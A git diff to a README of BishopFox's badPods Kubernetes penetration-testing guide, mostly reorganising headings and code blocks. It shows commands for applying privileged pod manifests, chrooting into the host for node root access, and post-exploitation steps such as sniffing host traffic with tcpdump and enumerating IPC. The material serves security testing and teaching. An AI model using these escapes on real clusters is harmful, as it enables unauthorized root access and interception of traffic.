@@ -48,7 +48,7 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/p
 # Exec into pod 
 kubectl -n [namespace] exec -it pod-chroot-node -- chroot /host
 # Do stuff in pod
-# You now have full root access to the pod
+# You now have full root access to the node
 ```
 
 Reference(s): 
@@ -135,15 +135,11 @@ The important things here are:
 
 
 ### Create pod
-Option 1: Create pod from local yaml 
-
-```bash
+```bash 
+# Option 1: Create pod from local yaml 
 kubectl apply -f pod-hostnetwork-only.yaml  [-n namespace] 
-```
 
-Option 2: Create pod from github hosted yaml
-
-```bash
+# Option 2: Create pod from github hosted yaml
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostnetwork-only.yaml [-n namespace] 
 ```
 
@@ -153,13 +149,12 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/p
 kubectl -n [namespace] exec -it bf-hostnetwork -- bash
 ```
 
-Install tcpdump and sniff traffic 
+### Post Exploitation 
 ```bash
+# Install tcpdump and sniff traffic 
 apt update && apt install tcpdump 
-```
 
-Or investigate local services
-```bash
+# Or investigate local services
 curl https://localhost:1234/metrics
 ```
 
@@ -171,14 +166,11 @@ If you only have `hostIPC=true`, you most likely can't do much. What you should 
 [pod-hostipc-only.yaml](yaml/pod-hostipc-only.yaml)
 
 ### Create pod
-Option 1: Create pod from local yaml 
 ```bash
+# Option 1: Create pod from local yaml 
 kubectl apply -f pod-hostipc-only.yaml  [-n namespace] 
-```
 
-Option 2: Create pod from github hosted yaml
-
-```bash
+# Option 2: Create pod from github hosted yaml
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostipc-only.yaml [-n namespace] 
 ```
 
@@ -186,12 +178,13 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/p
 ```bash
 kubectl -n [namespace] exec -it bf-hostipc -- bash
 ```
-Look for any use of inter= process communication on the host 
 
+### Post Exploitation 
+```bash
+Look for any use of inter-process communication on the host 
 ```bash
 ipcs -a
 ```
-
 
 Reference: https://opensource.com/article/20/1/inter-process-communication-linux
 
